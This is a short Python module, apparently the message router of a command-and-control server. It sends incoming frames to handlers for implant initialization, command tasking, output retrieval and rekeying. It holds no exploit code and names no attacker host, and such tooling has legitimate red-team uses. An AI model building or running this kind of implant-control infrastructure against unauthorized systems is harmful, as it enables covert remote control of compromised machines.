from lib import core
from lib import implants

destinations = {"lpo": core.send_manifest,
                "lpmo": core.initialized,
                "lprk": core.rekey,
                "rcmd": core.receive_command,
                "noop": core.noop,
                "ii": implants.initialize_implant,
                "icmdr": core.retrieve_command_for_implant,
                "fcmd": core.get_cmd_output
                }


def determine_destination(frame, component):
    if frame['cmd'] in destinations.keys():
        component.logging.log(f"Routing '{frame['cmd']}' frame to {destinations[frame['cmd']]}", level="debug",
                              source="lib.frame_orchestrator")
        return destinations[frame['cmd']](frame, component)
    else:
        component.logging.log(f"Invalid frame received", level="warn", source="lib.frame_orchestrator")
        component.logging.log(f"Invalid frame: {frame}", level="debug", source="lib.frame_orchestrator")
        return None
